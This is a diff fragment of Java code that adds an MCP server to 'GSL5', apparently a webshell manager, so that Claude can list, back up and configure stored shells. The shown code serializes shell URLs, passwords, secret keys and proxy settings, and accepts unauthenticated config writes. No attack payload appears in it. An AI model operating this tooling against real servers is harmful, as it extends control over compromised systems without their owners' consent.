+                sb.append(row.get(0)).append(" | ").append(row.size()>1?row.get(1):"").append(" | ").append(row.size()>4?row.get(4):"").append(" | ").append(row.size()>5?row.get(5):"").append("\n");
+            }
+            java.nio.file.Files.write(java.nio.file.Paths.get(genFile), sb.toString().getBytes(StandardCharsets.UTF_8));
+            return "\u5df2\u5907\u4efd " + rows.size() + " \u4e2a Shell \u5230 " + genFile;
+        } catch (Exception ex) { return "\u5907\u4efd\u5931\u8d25: " + ex.getMessage(); }
+    }
+
+    private String mcpStatus(Map<String, Object> a) {
+        int shellCount = Db.getAllShell().size() - 1;
+        return "GSL5 MCP Server\n" +
+            "  \u72b6\u6001: " + (running ? "\u8fd0\u884c\u4e2d" : "\u5df2\u505c\u6b62") + "\n" +
+            "  \u7aef\u53e3: " + port + "\n" +
+            "  \u5730\u5740: http://127.0.0.1:" + port + "\n" +
+            "  SSE \u5ba2\u6237\u7aef: " + sseClients.size() + "\n" +
+            "  Shell \u603b\u6570: " + Math.max(0, shellCount) + "\n" +
+            "  DB \u6a21\u5f0f: " + (core.ui.MainActivity.isRemoteDb ? "\u8fdc\u7a0b PostgreSQL" : "\u672c\u5730 SQLite");
+    }
+
+    private String mcpConfig(Map<String, Object> a) {
+        String json = "{\n" + "  \"mcpServers\": {\n" + "    \"gsl5\": {\n" + "      \"type\": \"sse\",\n" + "      \"url\": \"http://127.0.0.1:" + port + "/sse\"\n" + "    }\n" + "  }\n" + "}";
+        if (a != null && a.containsKey("outputPath")) {
+            try { java.nio.file.Files.write(java.nio.file.Paths.get((String)a.get("outputPath")), json.getBytes(StandardCharsets.UTF_8)); return "\u5df2\u5199\u5165: " + a.get("outputPath"); }
+            catch (Exception e) { return "\u5199\u5165\u5931\u8d25: " + e.getMessage() + "\n\n\u8bf7\u624b\u52a8\u5c06\u4ee5\u4e0b\u5185\u5bb9\u6dfb\u52a0\u5230 Claude \u7684 MCP \u914d\u7f6e\u6587\u4ef6\u4e2d:\n" + json; }
+        }
+        return "\u8bf7\u5c06\u4ee5\u4e0b JSON \u6dfb\u52a0\u5230 Claude \u7684 MCP \u914d\u7f6e\u6587\u4ef6\u4e2d:\n\n" + json;
+    }
+    class ConfigHandler implements HttpHandler {
+        public void handle(HttpExchange ex) throws IOException {
+            if ("OPTIONS".equals(ex.getRequestMethod())) { sendJson(ex, 200, "{}"); return; }
+            if ("GET".equals(ex.getRequestMethod())) {
+                String content = configRead(null);
+                sendJson(ex, 200, j("content", content));
+            } else {
+                byte[] bodyBytes = functions.readInputStream(ex.getRequestBody());
+                String body = new String(bodyBytes, StandardCharsets.UTF_8);
+                java.nio.file.Files.write(java.nio.file.Paths.get("config.yaml"), body.getBytes(StandardCharsets.UTF_8));
+                sendJson(ex, 200, j("status","ok","message","\u5199\u5165\u6210\u529f"));
+            }
+        }
+    }
+
+    // ==================== Serialization ====================
+    private String serializeShell(ShellEntity sh) {
+        return enc(sh.getUrl())+""+enc(sh.getPassword())+""+enc(sh.getSecretKey())+""
+            +enc(sh.getPayload())+""+enc(sh.getCryption())+""+enc(sh.getEncoding())+""
+            +enc(sh.getHeaderS())+""+enc(sh.getReqLeft())+""+enc(sh.getReqRight())+""
+            +sh.getConnTimeout()+""+sh.getReadTimeout()+""
+            +enc(sh.getProxyType())+""+enc(sh.getProxyHost())+""+sh.getProxyPort()+""
+            +enc(sh.getRemark())+""+enc(sh.getC2ProfileName()!=null?sh.getC2ProfileName():"")+""
+            +sh.getMaxErrRetry()+""+sh.getOnceBigFileDownloadByteNum()+""+sh.getOnceBigFileUploadByteNum()+""
+            +sh.getBigFileDownloadThreadNum()+""+sh.isMergeResponseCookie()+""
+            +enc(sh.getClientCertPath())+""+enc(sh.getClientCertPassword())+""+enc(sh.getGroup());
+    }
+    private static String enc(String v) {
+        if (v == null) return "";
+        try { return java.net.URLEncoder.encode(v, "UTF-8"); } catch (Exception e) { return v; }
+    }
+    private static String dec(String v) {
+        if (v == null || v.isEmpty()) return "";
+        try { return java.net.URLDecoder.decode(v, "UTF-8"); } catch (Exception e) { return v; }
+    }
+
+    // ==================== JSON Builder ====================
+    private static String j(Object... kv) {
+        StringBuilder sb = new StringBuilder("{");
+        for (int i = 0; i < kv.length; i += 2) { if (i>0)sb.append(","); sb.append("\"").append(kv[i]).append("\":").append(toJson(kv[i+1])); }
+        return sb.append("}").toString();
+    }
+    private static String m(Object... kv) {
+        StringBuilder sb = new StringBuilder("{");
+        for (int i = 0; i < kv.length; i += 2) { if (i>0)sb.append(","); sb.append("\"").append(kv[i]).append("\":").append(toJson(kv[i+1])); }
+        return sb.append("}").toString();
+    }
+    private static String a(Object... items) {
+        StringBuilder sb = new StringBuilder("[");
+        for (int i = 0; i < items.length; i++) { if (i>0)sb.append(","); sb.append(toJson(items[i])); }
+        return sb.append("]").toString();
+    }
+    private static String t(String name, String desc, String inputSchema) {
+        return "{\"name\":\""+esc(name)+"\",\"description\":\""+esc(desc)+"\",\"inputSchema\":"+inputSchema+"}";
+    }
+    private static String p(Object... kv) {
+        StringBuilder props = new StringBuilder("{");
+        StringBuilder required = new StringBuilder();
+        for (int i = 0; i < kv.length; i += 2) {
+            String k = (String) kv[i];
+            Object v = kv[i+1];
+            if (v instanceof String && ((String)v).startsWith("\u5fc5")) {
+                if (required.length()>0) required.append(",");
+                required.append("\"").append(k).append("\"");
+                props.append("\"").append(k).append("\":{\"type\":\"string\",\"description\":\"").append(esc((String)v)).append("\"}");
+            } else if (v instanceof String) {
+                props.append("\"").append(k).append("\":{\"type\":\"string\",\"description\":\"").append(esc((String)v)).append("\"}");
+            } else {
+                props.append("\"").append(k).append("\":").append(toJson(v));
+            }
+            if (i+2 < kv.length) props.append(",");
+        }
+        props.append("}");
+        String reqStr = required.length()>0 ? ",\"required\":["+required+"]" : "";
+        return "{\"type\":\"object\",\"properties\":"+props+reqStr+"}";
+    }
+    private static String s(String desc) { return desc; }
+    private static String i() { return "{\"type\":\"integer\",\"description\":\"\"}"; }
+
+    private static String toJson(Object v) {
+        if (v == null) return "null";
+        if (v instanceof Boolean) return v.toString();
+        if (v instanceof Number) return v.toString();
+        if (v instanceof String) {
+            String s = (String) v;
+            if (s.startsWith("{") || s.startsWith("[")) return s;
+            return "\"" + esc(s) + "\"";
+        }
+        return "\"" + esc(v.toString()) + "\"";
+    }
+    private static String esc(String s) {
+        if (s == null) return "";
+        StringBuilder sb = new StringBuilder(s.length()+8);
+        for (int i = 0; i < s.length(); i++) {
+            char c = s.charAt(i);
+            switch (c) {
+                case '"': sb.append("\\\""); break;
+                case '\\': sb.append("\\\\"); break;
+                case '\n': sb.append("\\n"); break;
+                case '\r': sb.append("\\r"); break;
+                case '\t': sb.append("\\t"); break;
+                default: sb.append(c);
+            }
+        }
+        return sb.toString();
+    }
+    private static void sendJson(HttpExchange ex, int code, String json) throws IOException {
+        byte[] bytes = json.getBytes(StandardCharsets.UTF_8);
+        ex.getResponseHeaders().set("Content-Type", "application/json; charset=utf-8");
+        ex.sendResponseHeaders(code, bytes.length);
+        ex.getResponseBody().write(bytes);
+        ex.close();
+    }
+}
